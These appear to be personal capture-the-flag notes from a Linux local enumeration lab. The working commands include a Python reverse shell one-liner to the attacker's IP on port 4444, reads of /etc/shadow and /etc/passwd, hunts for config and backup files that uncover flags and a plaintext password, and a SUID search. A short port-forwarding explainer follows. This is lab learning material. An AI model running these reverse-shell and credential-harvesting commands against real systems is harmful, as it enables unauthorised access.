# Linux_local_enumeration 

> VOiD | Thursday 05 August 2021 11:21:45 PM IST

My IP : 10.17.6.109
Target IP : 10.10.96.180

```bash
/cmd.php
has rce

python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.6.109",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

stabalize the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'


Execute 
uname -a to print out all information about the system

read
.bash_profile and .bashrc

sudo -V to retrieve the version.

flag 1 : thm{clear_the_history}

================================
check

/etc/passwd
/etc/shadow
/etc/hosts

find / -type f -name *.conf 2>/dev/null | grep flag
cat /etc/sysconf/flag.conf
flag: thm{conf_file}

find / -type f -name *.bak 2>/dev/null
cat /var/opt/passwords.bak
THMSkidyPass

==================================
find / -perm -u=s -type f 2>/dev/null


```


# PORTFORWARDING
```
Port Forwarding
According to Wikipedia, "Port forwarding is an application of network address translation (NAT) that redirects a communication request from one address and port number combination to another while the packets are traversing a network gateway, such as a router or firewall". 

Port forwarding not only allows you to bypass firewalls but also gives you an opportunity to enumerate some local services and processes running on the box. 

The Linux netstat command gives you a bunch of information about your network connections, the ports that are in use, and the processes using them. In order to see all TCP connections, execute netstat -at | less. This will give you a list of running processes that use TCP. From this point, you can easily enumerate running processes and gain some valuable information.

netstat -tulpn will provide you a much nicer output with the most interesting data.

```


